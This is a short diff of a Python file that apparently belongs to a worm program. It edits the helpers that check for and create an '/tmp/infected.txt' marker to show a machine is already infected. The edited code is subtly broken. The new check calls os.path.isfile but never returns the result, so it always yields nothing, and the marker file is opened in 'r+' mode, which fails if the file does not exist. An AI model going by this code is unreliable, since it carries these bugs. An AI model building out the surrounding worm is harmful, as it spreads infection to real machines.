@@ -28,12 +28,7 @@ def isInfectedSystem():
 	# you created when you marked the system
 	# as infected).
 	
-	try:
-		file = open("/tmp/infected.txt")
-		file.close()
-		return True
-	except IOError:
-		return False
+	os.path.isfile(INFECTED_MARKER_FILE)
 
 #################################################################
 # Marks the system as infected
@@ -44,8 +39,8 @@ def markInfected():
 	# this is to create a file called infected.txt
 	# in directory /tmp/
 	
-	file = open("/tmp/infected.txt", "r+")
-	file.write("This system is infected.")
+	file = open(INFECTED_MARKER_FILE, "r+")
+	file.write("INFECTED!")
 	file.close()
 
 ###############################################################
